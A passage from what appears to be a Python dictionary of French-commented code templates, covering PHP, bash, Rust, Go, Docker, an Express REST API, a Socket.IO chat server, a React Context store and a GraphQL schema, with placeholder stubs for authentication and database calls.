        "template": "<?php\n/**\n * Description de la fonction\n * @param mixed ${args} Description\n * @return mixed Description du retour\n */\nfunction {name}(${args}) {{\n    {body}\n    return $result;\n}}\n\n// Appel\n$result = {name}($arg1, $arg2);\n?>\n"
    },
    "php_class": {
        "patterns": ["classe php", "class php", "php class"],
        "template": "<?php\n/**\n * Description de la classe\n */\nclass {name} {{\n    // Propriétés\n    private $id;\n    private $nom;\n    \n    // Constructeur\n    public function __construct($id, $nom) {{\n        $this->id = $id;\n        $this->nom = $nom;\n    }}\n    \n    // Getter\n    public function getId() {{\n        return $this->id;\n    }}\n    \n    // Setter\n    public function setNom($nom) {{\n        $this->nom = $nom;\n    }}\n    \n    // Méthode\n    public function methode() {{\n        {body}\n    }}\n}}\n\n// Utilisation\n$instance = new {name}(1, 'Example');\n?>\n"
    },
    "php_database": {
        "patterns": ["pdo php", "database php", "mysql php"],
        "template": "<?php\ntry {{\n    // Connexion PDO\n    $pdo = new PDO(\n        'mysql:host=localhost;dbname=database;charset=utf8',\n        'username',\n        'password',\n        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]\n    );\n    \n    // SELECT\n    $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');\n    $stmt->execute(['id' => $id]);\n    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);\n    \n    // INSERT\n    $stmt = $pdo->prepare('INSERT INTO users (nom, email) VALUES (:nom, :email)');\n    $stmt->execute([\n        'nom' => $nom,\n        'email' => $email\n    ]);\n    \n    // Dernier ID inséré\n    $lastId = $pdo->lastInsertId();\n    \n}} catch (PDOException $e) {{\n    die('Erreur: ' . $e->getMessage());\n}}\n?>\n"
    },
    
    # ===== BASH =====
    "bash_script": {
        "patterns": ["script bash", "bash script", "shell script"],
        "template": "#!/bin/bash\n\n# Description du script\n# Usage: ./script.sh [args]\n\nset -e  # Arrêter sur erreur\nset -u  # Erreur si variable non définie\n\n# Variables\nVARIABLE=\"valeur\"\n\n# Fonctions\nfunction {name}() {{\n    echo \"Fonction {name}\"\n    {body}\n}}\n\n# Arguments\nif [ $# -eq 0 ]; then\n    echo \"Usage: $0 <argument>\"\n    exit 1\nfi\n\n# Conditions\nif [ -f \"fichier.txt\" ]; then\n    echo \"Le fichier existe\"\nelif [ -d \"dossier\" ]; then\n    echo \"Le dossier existe\"\nelse\n    echo \"Rien n'existe\"\nfi\n\n# Boucles\nfor i in {{1..5}}; do\n    echo \"Itération $i\"\ndone\n\nwhile read ligne; do\n    echo \"$ligne\"\ndone < fichier.txt\n\n# Appel fonction\n{name}\n"
    },
    
    # ===== RUST =====
    "rust_function": {
        "patterns": ["fonction rust", "function rust", "fn rust"],
        "template": "/// Description de la fonction\n/// \n/// # Arguments\n/// \n/// * `{args}` - Description\n/// \n/// # Examples\n/// \n/// ```\n/// let result = {name}(arg);\n/// ```\nfn {name}({args}) -> Result<(), Error> {{\n    {body}\n    Ok(())\n}}\n"
    },
    "rust_struct": {
        "patterns": ["struct rust", "structure rust", "rust struct"],
        "template": "#[derive(Debug, Clone)]\npub struct {name} {{\n    pub id: i32,\n    pub nom: String,\n}}\n\nimpl {name} {{\n    pub fn new(id: i32, nom: String) -> Self {{\n        Self {{ id, nom }}\n    }}\n    \n    pub fn methode(&self) {{\n        {body}\n    }}\n}}\n"
    },
    
    # ===== GO =====
    "go_function": {
        "patterns": ["fonction go", "function go", "func go"],
        "template": "// {name} description de la fonction\nfunc {name}({args}) (result type, err error) {{\n    {body}\n    return result, nil\n}}\n"
    },
    "go_struct": {
        "patterns": ["struct go", "structure go", "go struct"],
        "template": "// {name} description de la structure\ntype {name} struct {{\n    ID   int\n    Name string\n}}\n\n// New{name} crée une nouvelle instance\nfunc New{name}(id int, name string) *{name} {{\n    return &{name}{{\n        ID:   id,\n        Name: name,\n    }}\n}}\n\n// Method description\nfunc (n *{name}) Method() {{\n    {body}\n}}\n"
    },
    
    # ===== MARKDOWN =====
    "markdown_template": {
        "patterns": ["markdown template", "md template", "documentation markdown"],
        "template": "# Titre Principal\n\n## Introduction\n\nDescription du projet.\n\n## Installation\n\n```bash\nnpm install\n```\n\n## Utilisation\n\n```javascript\nconst exemple = require('exemple');\n```\n\n## API\n\n### Fonction 1\n\n- **Description**: Description de la fonction\n- **Paramètres**:\n  - `param1` (type): Description\n  - `param2` (type): Description\n- **Retour**: Type de retour\n\n### Fonction 2\n\n| Paramètre | Type | Description |\n|-----------|------|-------------|\n| param1    | int  | Description |\n| param2    | str  | Description |\n\n## Exemples\n\n```python\n# Exemple 1\nresult = fonction(param1, param2)\n```\n\n## Licence\n\nMIT\n"
    },
    
    # ===== DOCKER =====
    "dockerfile": {
        "patterns": ["dockerfile", "docker file", "conteneur docker"],
        "template": "# Dockerfile\nFROM python:3.11-slim\n\n# Variables d'environnement\nENV PYTHONUNBUFFERED=1\nENV PYTHONDONTWRITEBYTECODE=1\n\n# Répertoire de travail\nWORKDIR /app\n\n# Dépendances système\nRUN apt-get update && apt-get install -y \\\\\n    build-essential \\\\\n    && rm -rf /var/lib/apt/lists/*\n\n# Dépendances Python\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Copier l'application\nCOPY . .\n\n# Exposer le port\nEXPOSE 8000\n\n# Utilisateur non-root\nRUN useradd -m appuser\nUSER appuser\n\n# Commande de démarrage\nCMD [\"python\", \"app.py\"]\n"
    },
    "docker_compose": {
        "patterns": ["docker compose", "docker-compose", "compose yaml"],
        "template": "version: '3.8'\n\nservices:\n  app:\n    build: .\n    ports:\n      - \"8000:8000\"\n    environment:\n      - DATABASE_URL=postgresql://user:pass@db:5432/dbname\n    depends_on:\n      - db\n    volumes:\n      - ./app:/app\n    restart: unless-stopped\n  \n  db:\n    image: postgres:15\n    environment:\n      POSTGRES_DB: dbname\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    restart: unless-stopped\n  \n  redis:\n    image: redis:7-alpine\n    restart: unless-stopped\n\nvolumes:\n  postgres_data:\n"
    },
    
    # ========================================
    # NODE.JS / EXPRESS AVANCÉ - 20 TEMPLATES
    # ========================================
    
    "nodejs_express_api_rest": {
        "patterns": ["api rest express", "express rest api", "nodejs rest api complete"],
        "template": """// ===== REST API Complete avec Express.js =====
import express, { Request, Response, NextFunction } from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import rateLimit from 'express-rate-limit';
import compression from 'compression';
import { body, validationResult } from 'express-validator';

// ========================================
// CONFIGURATION & MIDDLEWARE
// ========================================

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware de sécurité
app.use(helmet());
app.use(cors({
    origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
    credentials: true
}));

// Body parsing
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Compression
app.use(compression());

// Logging
app.use(morgan('combined'));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limite de 100 requêtes
    message: 'Trop de requêtes, réessayez plus tard'
});
app.use('/api/', limiter);

// ========================================
// MIDDLEWARE PERSONNALISÉS
// ========================================

// Middleware d'authentification
interface AuthRequest extends Request {
    user?: {
        id: string;
        role: string;
    };
}

const authenticate = async (
    req: AuthRequest,
    res: Response,
    next: NextFunction
) => {
    try {
        const token = req.headers.authorization?.split(' ')[1];
        
        if (!token) {
            return res.status(401).json({
                success: false,
                error: 'Token manquant'
            });
        }
        
        // Vérifier le token (JWT, session, etc.)
        const user = await verifyToken(token);
        req.user = user;
        next();
    } catch (error) {
        res.status(401).json({
            success: false,
            error: 'Authentification échouée'
        });
    }
};

// Middleware de validation
const validate = (req: Request, res: Response, next: NextFunction) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({
            success: false,
            errors: errors.array()
        });
    }
    next();
};

// Middleware d'erreur global
const errorHandler = (
    err: Error,
    req: Request,
    res: Response,
    next: NextFunction
) => {
    console.error('Error:', err);
    
    res.status(500).json({
        success: false,
        error: err.message || 'Erreur serveur interne',
        ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    });
};

// ========================================
// ROUTES & CONTROLLERS
// ========================================

// Health check
app.get('/health', (req: Request, res: Response) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// CRUD Routes pour une ressource
class ResourceController {
    // GET /api/resources - Liste tous les éléments
    static async getAll(req: Request, res: Response, next: NextFunction) {
        try {
            const { page = 1, limit = 10, sort = 'createdAt', order = 'desc' } = req.query;
            
            const resources = await fetchResourcesFromDB({
                page: Number(page),
                limit: Number(limit),
                sort: String(sort),
                order: String(order)
            });
            
            res.json({
                success: true,
                data: resources,
                pagination: {
                    page: Number(page),
                    limit: Number(limit),
                    total: resources.length
                }
            });
        } catch (error) {
            next(error);
        }
    }
    
    // GET /api/resources/:id - Récupère un élément
    static async getById(req: Request, res: Response, next: NextFunction) {
        try {
            const { id } = req.params;
            const resource = await fetchResourceById(id);
            
            if (!resource) {
                return res.status(404).json({
                    success: false,
                    error: 'Ressource non trouvée'
                });
            }
            
            res.json({
                success: true,
                data: resource
            });
        } catch (error) {
            next(error);
        }
    }
    
    // POST /api/resources - Crée un élément
    static async create(req: AuthRequest, res: Response, next: NextFunction) {
        try {
            const data = req.body;
            const resource = await createResource({
                ...data,
                userId: req.user?.id
            });
            
            res.status(201).json({
                success: true,
                data: resource
            });
        } catch (error) {
            next(error);
        }
    }
    
    // PUT /api/resources/:id - Met à jour un élément
    static async update(req: AuthRequest, res: Response, next: NextFunction) {
        try {
            const { id } = req.params;
            const data = req.body;
            
            const resource = await updateResource(id, data);
            
            if (!resource) {
                return res.status(404).json({
                    success: false,
                    error: 'Ressource non trouvée'
                });
            }
            
            res.json({
                success: true,
                data: resource
            });
        } catch (error) {
            next(error);
        }
    }
    
    // DELETE /api/resources/:id - Supprime un élément
    static async delete(req: AuthRequest, res: Response, next: NextFunction) {
        try {
            const { id } = req.params;
            await deleteResource(id);
            
            res.json({
                success: true,
                message: 'Ressource supprimée'
            });
        } catch (error) {
            next(error);
        }
    }
}

// Enregistrer les routes
const router = express.Router();

router.get('/resources', ResourceController.getAll);
router.get('/resources/:id', ResourceController.getById);
router.post(
    '/resources',
    authenticate,
    [
        body('name').isLength({ min: 3 }).trim(),
        body('email').isEmail().normalizeEmail(),
        body('age').isInt({ min: 0, max: 120 })
    ],
    validate,
    ResourceController.create
);
router.put('/resources/:id', authenticate, ResourceController.update);
router.delete('/resources/:id', authenticate, ResourceController.delete);

app.use('/api', router);

// ========================================
// GESTIONNAIRE D'ERREURS & DÉMARRAGE
// ========================================

// 404 Handler
app.use((req: Request, res: Response) => {
    res.status(404).json({
        success: false,
        error: 'Route non trouvée'
    });
});

// Error handler
app.use(errorHandler);

// Démarrage du serveur
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📝 Environment: ${process.env.NODE_ENV || 'development'}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM reçu, fermeture gracieuse...');
    process.exit(0);
});

// ========================================
// HELPERS (à implémenter selon votre DB)
// ========================================

async function verifyToken(token: string) {
    // Implémenter la vérification JWT
    return { id: '123', role: 'user' };
}

async function fetchResourcesFromDB(options: any) {
    // Implémenter la récupération depuis la DB
    return [];
}

async function fetchResourceById(id: string) {
    // Implémenter la récupération depuis la DB
    return null;
}

async function createResource(data: any) {
    // Implémenter la création en DB
    return data;
}

async function updateResource(id: string, data: any) {
    // Implémenter la mise à jour en DB
    return data;
}

async function deleteResource(id: string) {
    // Implémenter la suppression en DB
}

export default app;
"""
    },
    
    "nodejs_websocket_server": {
        "patterns": ["websocket nodejs", "socket.io server", "real-time nodejs"],
        "template": """// ===== WebSocket Server avec Socket.IO =====
import express from 'express';
import { createServer } from 'http';
import { Server, Socket } from 'socket.io';
import cors from 'cors';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: process.env.CLIENT_URL || 'http://localhost:3000',
        methods: ['GET', 'POST']
    }
});

// ========================================
// TYPES & INTERFACES
// ========================================

interface User {
    id: string;
    username: string;
    room: string;
}

interface Message {
    id: string;
    userId: string;
    username: string;
    content: string;
    timestamp: Date;
    room: string;
}

// ========================================
// ÉTAT GLOBAL
// ========================================

const connectedUsers = new Map<string, User>();
const rooms = new Map<string, Set<string>>();
const messages = new Map<string, Message[]>();

// ========================================
// MIDDLEWARE SOCKET.IO
// ========================================

io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    
    if (!token) {
        return next(new Error('Authentification requise'));
    }
    
    // Vérifier le token
    try {
        const user = verifyToken(token);
        socket.data.user = user;
        next();
    } catch (error) {
        next(new Error('Token invalide'));
    }
});

// ========================================
// GESTION DES CONNEXIONS
// ========================================

io.on('connection', (socket: Socket) => {
    console.log(`✅ User connected: ${socket.id}`);
    
    const user: User = {
        id: socket.id,
        username: socket.data.user?.username || 'Anonymous',
        room: 'general'
    };
    
    connectedUsers.set(socket.id, user);
    
    // ========================================
    // ÉVÉNEMENTS DE CHAT
    // ========================================
    
    // Rejoindre une room
    socket.on('join-room', (roomName: string) => {
        // Quitter l'ancienne room
        if (user.room) {
            socket.leave(user.room);
            removeUserFromRoom(socket.id, user.room);
        }
        
        // Rejoindre la nouvelle room
        user.room = roomName;
        socket.join(roomName);
        addUserToRoom(socket.id, roomName);
        
        // Notifier les autres utilisateurs
        socket.to(roomName).emit('user-joined', {
            userId: socket.id,
            username: user.username,
            room: roomName
        });
        
        // Envoyer l'historique des messages
        const roomMessages = messages.get(roomName) || [];
        socket.emit('message-history', roomMessages);
        
        // Envoyer la liste des utilisateurs
        const roomUsers = getRoomUsers(roomName);
        io.to(roomName).emit('room-users', roomUsers);
        
        console.log(`👤 ${user.username} joined room: ${roomName}`);
    });
    
    // Envoyer un message
    socket.on('send-message', (content: string) => {
        const message: Message = {
            id: generateId(),
            userId: socket.id,
            username: user.username,
            content: sanitizeMessage(content),
            timestamp: new Date(),
            room: user.room
        };
        
        // Sauvegarder le message
        if (!messages.has(user.room)) {
            messages.set(user.room, []);
        }
        messages.get(user.room)!.push(message);
        
        // Limiter l'historique à 100 messages
        const roomMessages = messages.get(user.room)!;
        if (roomMessages.length > 100) {
            roomMessages.shift();
        }
        
        // Diffuser le message à la room
        io.to(user.room).emit('new-message', message);
        
        console.log(`💬 Message from ${user.username}: ${content.substring(0, 50)}...`);
    });
    
    // Typing indicator
    socket.on('typing-start', () => {
        socket.to(user.room).emit('user-typing', {
            userId: socket.id,
            username: user.username
        });
    });
    
    socket.on('typing-stop', () => {
        socket.to(user.room).emit('user-stopped-typing', {
            userId: socket.id
        });
    });
    
    // ========================================
    // ÉVÉNEMENTS PERSONNALISÉS
    // ========================================
    
    // Réaction à un message
    socket.on('react-to-message', ({ messageId, emoji }: { messageId: string; emoji: string }) => {
        io.to(user.room).emit('message-reaction', {
            messageId,
            userId: socket.id,
            username: user.username,
            emoji
        });
    });
    
    // Commencer un appel vidéo
    socket.on('start-video-call', (targetUserId: string) => {
        socket.to(targetUserId).emit('incoming-video-call', {
            from: socket.id,
            username: user.username
        });
    });
    
    // WebRTC signaling
    socket.on('webrtc-offer', ({ to, offer }: { to: string; offer: any }) => {
        socket.to(to).emit('webrtc-offer', {
            from: socket.id,
            offer
        });
    });
    
    socket.on('webrtc-answer', ({ to, answer }: { to: string; answer: any }) => {
        socket.to(to).emit('webrtc-answer', {
            from: socket.id,
            answer
        });
    });
    
    socket.on('webrtc-ice-candidate', ({ to, candidate }: { to: string; candidate: any }) => {
        socket.to(to).emit('webrtc-ice-candidate', {
            from: socket.id,
            candidate
        });
    });
    
    // ========================================
    // DÉCONNEXION
    // ========================================
    
    socket.on('disconnect', () => {
        console.log(`❌ User disconnected: ${socket.id}`);
        
        // Notifier les autres utilisateurs
        socket.to(user.room).emit('user-left', {
            userId: socket.id,
            username: user.username
        });
        
        // Nettoyer l'état
        connectedUsers.delete(socket.id);
        removeUserFromRoom(socket.id, user.room);
        
        // Mettre à jour la liste des utilisateurs
        const roomUsers = getRoomUsers(user.room);
        io.to(user.room).emit('room-users', roomUsers);
    });
    
    // Gestion des erreurs
    socket.on('error', (error) => {
        console.error(`Socket error for ${socket.id}:`, error);
    });
});

// ========================================
// FONCTIONS UTILITAIRES
// ========================================

function addUserToRoom(userId: string, roomName: string) {
    if (!rooms.has(roomName)) {
        rooms.set(roomName, new Set());
    }
    rooms.get(roomName)!.add(userId);
}

function removeUserFromRoom(userId: string, roomName: string) {
    if (rooms.has(roomName)) {
        rooms.get(roomName)!.delete(userId);
        
        // Supprimer la room si vide
        if (rooms.get(roomName)!.size === 0) {
            rooms.delete(roomName);
            messages.delete(roomName);
        }
    }
}

function getRoomUsers(roomName: string): User[] {
    const userIds = rooms.get(roomName) || new Set();
    return Array.from(userIds)
        .map(id => connectedUsers.get(id))
        .filter((user): user is User => user !== undefined);
}

function sanitizeMessage(content: string): string {
    // Nettoyer le message (XSS, etc.)
    return content
        .trim()
        .replace(/<[^>]*>/g, '')
        .substring(0, 1000);
}

function generateId(): string {
    return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

function verifyToken(token: string) {
    // Implémenter la vérification du token
    return { username: 'User' };
}

// ========================================
// API REST POUR LES STATISTIQUES
// ========================================

app.get('/api/stats', (req, res) => {
    res.json({
        connectedUsers: connectedUsers.size,
        activeRooms: rooms.size,
        totalMessages: Array.from(messages.values())
            .reduce((sum, msgs) => sum + msgs.length, 0)
    });
});

app.get('/api/rooms', (req, res) => {
    const roomList = Array.from(rooms.entries()).map(([name, users]) => ({
        name,
        userCount: users.size,
        users: Array.from(users).map(id => {
            const user = connectedUsers.get(id);
            return user ? { id: user.id, username: user.username } : null;
        }).filter(Boolean)
    }));
    
    res.json(roomList);
});

// ========================================
// DÉMARRAGE DU SERVEUR
// ========================================

const PORT = process.env.PORT || 3001;

httpServer.listen(PORT, () => {
    console.log(`🚀 WebSocket server running on port ${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM reçu, fermeture des connexions...');
    io.close(() => {
        console.log('Toutes les connexions fermées');
        process.exit(0);
    });
});

export { app, io };
"""
    },
    
    # ========================================
    # REACT AVANCÉ - 15 TEMPLATES
    # ========================================
    
    "react_context_store": {
        "patterns": ["react context avancé", "global state react", "react store"],
        "template": """// ===== Global State Management avec Context API =====
import React, { 
    createContext, 
    useContext, 
    useReducer, 
    useCallback,
    useMemo,
    ReactNode,
    Dispatch
} from 'react';

// ========================================
// TYPES & INTERFACES
// ========================================

interface User {
    id: string;
    name: string;
    email: string;
    role: 'admin' | 'user' | 'guest';
}

interface AppState {
    user: User | null;
    isAuthenticated: boolean;
    isLoading: boolean;
    error: string | null;
    theme: 'light' | 'dark';
    notifications: Notification[];
    settings: Settings;
}

interface Settings {
    language: string;
    timezone: string;
    notifications: boolean;
}

interface Notification {
    id: string;
    type: 'success' | 'error' | 'warning' | 'info';
    message: string;
    timestamp: Date;
}

// ========================================
// ACTIONS
// ========================================

type Action =
    | { type: 'LOGIN_START' }
    | { type: 'LOGIN_SUCCESS'; payload: User }
    | { type: 'LOGIN_FAILURE'; payload: string }
    | { type: 'LOGOUT' }
    | { type: 'SET_LOADING'; payload: boolean }
    | { type: 'SET_ERROR'; payload: string | null }
    | { type: 'TOGGLE_THEME' }
    | { type: 'ADD_NOTIFICATION'; payload: Omit<Notification, 'id' | 'timestamp'> }
    | { type: 'REMOVE_NOTIFICATION'; payload: string }
    | { type: 'UPDATE_SETTINGS'; payload: Partial<Settings> };

// ========================================
// REDUCER
// ========================================

const initialState: AppState = {
    user: null,
    isAuthenticated: false,
    isLoading: false,
    error: null,
    theme: 'light',
    notifications: [],
    settings: {
        language: 'fr',
        timezone: 'Europe/Paris',
        notifications: true
    }
};

function appReducer(state: AppState, action: Action): AppState {
    switch (action.type) {
        case 'LOGIN_START':
            return {
                ...state,
                isLoading: true,
                error: null
            };
        
        case 'LOGIN_SUCCESS':
            return {
                ...state,
                user: action.payload,
                isAuthenticated: true,
                isLoading: false,
                error: null
            };
        
        case 'LOGIN_FAILURE':
            return {
                ...state,
                isLoading: false,
                error: action.payload
            };
        
        case 'LOGOUT':
            return {
                ...state,
                user: null,
                isAuthenticated: false
            };
        
        case 'SET_LOADING':
            return {
                ...state,
                isLoading: action.payload
            };
        
        case 'SET_ERROR':
            return {
                ...state,
                error: action.payload
            };
        
        case 'TOGGLE_THEME':
            return {
                ...state,
                theme: state.theme === 'light' ? 'dark' : 'light'
            };
        
        case 'ADD_NOTIFICATION':
            return {
                ...state,
                notifications: [
                    ...state.notifications,
                    {
                        ...action.payload,
                        id: Date.now().toString(),
                        timestamp: new Date()
                    }
                ]
            };
        
        case 'REMOVE_NOTIFICATION':
            return {
                ...state,
                notifications: state.notifications.filter(n => n.id !== action.payload)
            };
        
        case 'UPDATE_SETTINGS':
            return {
                ...state,
                settings: {
                    ...state.settings,
                    ...action.payload
                }
            };
        
        default:
            return state;
    }
}

// ========================================
// CONTEXT
// ========================================

interface AppContextValue {
    state: AppState;
    dispatch: Dispatch<Action>;
    // Actions typées
    login: (email: string, password: string) => Promise<void>;
    logout: () => void;
    toggleTheme: () => void;
    addNotification: (notification: Omit<Notification, 'id' | 'timestamp'>) => void;
    removeNotification: (id: string) => void;
    updateSettings: (settings: Partial<Settings>) => void;
}

const AppContext = createContext<AppContextValue | undefined>(undefined);

// ========================================
// PROVIDER
// ========================================

interface AppProviderProps {
    children: ReactNode;
}

export function AppProvider({ children }: AppProviderProps) {
    const [state, dispatch] = useReducer(appReducer, initialState);
    
    // ========================================
    // ACTIONS MÉTIER
    // ========================================
    
    const login = useCallback(async (email: string, password: string) => {
        dispatch({ type: 'LOGIN_START' });
        
        try {
            // Simuler un appel API
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });
            
            if (!response.ok) {
                throw new Error('Identifiants invalides');
            }
            
            const user = await response.json();
            
            dispatch({ type: 'LOGIN_SUCCESS', payload: user });
            dispatch({
                type: 'ADD_NOTIFICATION',
                payload: {
                    type: 'success',
                    message: `Bienvenue ${user.name} !`
                }
            });
            
            // Sauvegarder le token
            localStorage.setItem('auth_token', user.token);
            
        } catch (error) {
            const errorMessage = error instanceof Error ? error.message : 'Erreur de connexion';
            dispatch({ type: 'LOGIN_FAILURE', payload: errorMessage });
            dispatch({
                type: 'ADD_NOTIFICATION',
                payload: {
                    type: 'error',
                    message: errorMessage
                }
            });
        }
    }, []);
    
    const logout = useCallback(() => {
        dispatch({ type: 'LOGOUT' });
        localStorage.removeItem('auth_token');
        dispatch({
            type: 'ADD_NOTIFICATION',
            payload: {
                type: 'info',
                message: 'Vous êtes déconnecté'
            }
        });
    }, []);
    
    const toggleTheme = useCallback(() => {
        dispatch({ type: 'TOGGLE_THEME' });
        const newTheme = state.theme === 'light' ? 'dark' : 'light';
        localStorage.setItem('theme', newTheme);
    }, [state.theme]);
    
    const addNotification = useCallback((notification: Omit<Notification, 'id' | 'timestamp'>) => {
        dispatch({ type: 'ADD_NOTIFICATION', payload: notification });
        
        // Auto-remove après 5 secondes
        setTimeout(() => {
            // L'ID sera ajouté par le reducer
        }, 5000);
    }, []);
    
    const removeNotification = useCallback((id: string) => {
        dispatch({ type: 'REMOVE_NOTIFICATION', payload: id });
    }, []);
    
    const updateSettings = useCallback((settings: Partial<Settings>) => {
        dispatch({ type: 'UPDATE_SETTINGS', payload: settings });
        localStorage.setItem('settings', JSON.stringify(settings));
    }, []);
    
    // ========================================
    // VALUE MÉMOÏSÉE
    // ========================================
    
    const value = useMemo<AppContextValue>(() => ({
        state,
        dispatch,
        login,
        logout,
        toggleTheme,
        addNotification,
        removeNotification,
        updateSettings
    }), [state, login, logout, toggleTheme, addNotification, removeNotification, updateSettings]);
    
    return (
        <AppContext.Provider value={value}>
            {children}
        </AppContext.Provider>
    );
}

// ========================================
// HOOK PERSONNALISÉ
// ========================================

export function useApp() {
    const context = useContext(AppContext);
    
    if (context === undefined) {
        throw new Error('useApp must be used within AppProvider');
    }
    
    return context;
}

// ========================================
// HOOKS SPÉCIALISÉS
// ========================================

export function useAuth() {
    const { state, login, logout } = useApp();
    
    return {
        user: state.user,
        isAuthenticated: state.isAuthenticated,
        isLoading: state.isLoading,
        error: state.error,
        login,
        logout
    };
}

export function useTheme() {
    const { state, toggleTheme } = useApp();
    
    return {
        theme: state.theme,
        toggleTheme
    };
}

export function useNotifications() {
    const { state, addNotification, removeNotification } = useApp();
    
    return {
        notifications: state.notifications,
        addNotification,
        removeNotification
    };
}

export function useSettings() {
    const { state, updateSettings } = useApp();
    
    return {
        settings: state.settings,
        updateSettings
    };
}

// ========================================
// EXEMPLE D'UTILISATION
// ========================================

export function LoginForm() {
    const { login, isLoading, error } = useAuth();
    const [email, setEmail] = React.useState('');
    const [password, setPassword] = React.useState('');
    
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        await login(email, password);
    };
    
    return (
        <form onSubmit={handleSubmit}>
            <input
                type="email"
                value={email}
                onChange={e => setEmail(e.target.value)}
                placeholder="Email"
                disabled={isLoading}
            />
            <input
                type="password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Password"
                disabled={isLoading}
            />
            <button type="submit" disabled={isLoading}>
                {isLoading ? 'Connexion...' : 'Se connecter'}
            </button>
            {error && <p className="error">{error}</p>}
        </form>
    );
}

export function ThemeToggle() {
    const { theme, toggleTheme } = useTheme();
    
    return (
        <button onClick={toggleTheme}>
            {theme === 'light' ? '🌙' : '☀️'} Toggle Theme
        </button>
    );
}

export function NotificationList() {
    const { notifications, removeNotification } = useNotifications();
    
    return (
        <div className="notifications">
            {notifications.map(notification => (
                <div key={notification.id} className={`notification ${notification.type}`}>
                    <p>{notification.message}</p>
                    <button onClick={() => removeNotification(notification.id)}>×</button>
                </div>
            ))}
        </div>
    );
}
"""
    },
    
    # ========================================
    # GRAPHQL - 10 TEMPLATES
    # ========================================
    
    "graphql_schema_complete": {
        "patterns": ["graphql schema", "schéma graphql complet", "apollo server"],
        "template": """# ===== GraphQL Schema Complet =====
type Query {
  # Utilisateurs
  user(id: ID!): User
  users(
    page: Int = 1
    limit: Int = 10
    search: String
    role: UserRole
    sortBy: UserSortField = CREATED_AT
    sortOrder: SortOrder = DESC
  ): UserConnection!
  
  # Posts
  post(id: ID!): Post
  posts(
    page: Int = 1
    limit: Int = 10
    authorId: ID
    categoryId: ID
    status: PostStatus
  ): PostConnection!
  
  # Recherche globale
  search(query: String!, type: SearchType): [SearchResult!]!
  
  # Statistiques
  stats: Stats!
}

type Mutation {
  # Authentification
  register(input: RegisterInput!): AuthPayload!
  login(input: LoginInput!): AuthPayload!
  logout: Boolean!
  refreshToken(token: String!): AuthPayload!
  
  # Utilisateurs
  updateUser(id: ID!, input: UpdateUserInput!): User!
  deleteUser(id: ID!): Boolean!
  changePassword(oldPassword: String!, newPassword: String!): Boolean!
  
  # Posts
  createPost(input: CreatePostInput!): Post!
  updatePost(id: ID!, input: UpdatePostInput!): Post!
  deletePost(id: ID!): Boolean!
  publishPost(id: ID!): Post!
  
  # Commentaires
  createComment(postId: ID!, content: String!): Comment!
  updateComment(id: ID!, content: String!): Comment!
  deleteComment(id: ID!): Boolean!
  
  # Likes
  toggleLike(postId: ID!): Post!
}

type Subscription {
  # Notifications en temps réel
  notificationAdded(userId: ID!): Notification!
  
  # Nouveaux posts
  postAdded: Post!
  postUpdated(id: ID!): Post!
  
  # Commentaires
  commentAdded(postId: ID!): Comment!
  
  # Présence utilisateurs
  userStatusChanged(userId: ID!): UserStatus!
}

# ========================================
# TYPES
# ========================================

type User {
  id: ID!
  username: String!
  email: String!
  firstName: String
  lastName: String
  fullName: String
  avatar: String
  bio: String
  role: UserRole!
  status: UserStatus!
  emailVerified: Boolean!
  createdAt: DateTime!
  updatedAt: DateTime!
  
  # Relations
  posts(limit: Int = 10): [Post!]!
  comments: [Comment!]!
  followers: [User!]!
  following: [User!]!
  
  # Compteurs
  postsCount: Int!
  followersCount: Int!
  followingCount: Int!
}

type Post {
  id: ID!
  title: String!
  slug: String!
  content: String!
  excerpt: String
  coverImage: String
  status: PostStatus!
  publishedAt: DateTime
  createdAt: DateTime!
  updatedAt: DateTime!
  
  # Relations
  author: User!
  category: Category
  tags: [Tag!]!
  comments(limit: Int = 10): [Comment!]!
  
  # Compteurs
  viewsCount: Int!
  likesCount: Int!
  commentsCount: Int!
  
  # Permissions
  canEdit: Boolean!
  canDelete: Boolean!
}

type Comment {
  id: ID!
  content: String!
  createdAt: DateTime!
  updatedAt: DateTime!
  
  author: User!
  post: Post!
  parent: Comment
  replies: [Comment!]!
}

type Category {
  id: ID!
  name: String!
  slug: String!
  description: String
  posts: [Post!]!
  postsCount: Int!
}

type Tag {
  id: ID!
  name: String!
  slug: String!
  posts: [Post!]!
  postsCount: Int!
}

type Notification {
  id: ID!
  type: NotificationType!
  title: String!
  message: String!
  read: Boolean!
  link: String
  createdAt: DateTime!
  user: User!
}

type Stats {
  usersTotal: Int!
  postsTotal: Int!
  commentsTotal: Int!
  viewsTotal: Int!
}

# ========================================
# ENUMS
# ========================================

enum UserRole {
  ADMIN
  MODERATOR
  USER
  GUEST
}

enum UserStatus {
  ONLINE
  OFFLINE
  AWAY
  BUSY
}

enum PostStatus {
  DRAFT
  PUBLISHED
  ARCHIVED
}

enum NotificationType {
  LIKE
  COMMENT
  FOLLOW
  MENTION
  SYSTEM
}

enum SortOrder {
  ASC
  DESC
}

enum UserSortField {
